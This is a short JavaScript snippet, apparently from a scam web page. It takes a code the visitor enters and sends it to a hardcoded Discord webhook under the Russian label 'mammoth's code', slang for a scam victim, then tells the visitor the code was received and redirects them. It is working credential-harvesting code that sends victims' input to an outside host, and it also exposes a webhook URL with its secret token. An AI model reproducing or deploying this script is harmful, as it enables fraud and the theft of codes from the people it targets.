document.getElementById('submitBtn').addEventListener('click', function() {
    const inviteCode = document.getElementById('inviteCode').value;
    if (inviteCode) {
        sendToDiscord(inviteCode);
    } else {
        alert('Please enter a code!');
    }
});

function sendToDiscord(code) {
    const webhookURL = 'https://discordapp.com/api/webhooks/1299013641084866674/PKIfals7J4p1kYsUJCQesFHK06vZKKR_dL2T_cLvxFylqnsEweKVADcKz-N_Ej4yzNRv'; // Replace with your actual Discord webhook URL
    const payload = {
        content: `Код мамонта: ${code}`
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    })
    .then(response => {
        if (response.ok) {
            alert('Код получен');
            window.location.href = 'http://127.0.0.1:5500/reg.html'; // Change this to the page you want to redirect to
        } else {
            alert('Failed to send code.');
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('An error occurred.');
    });
}
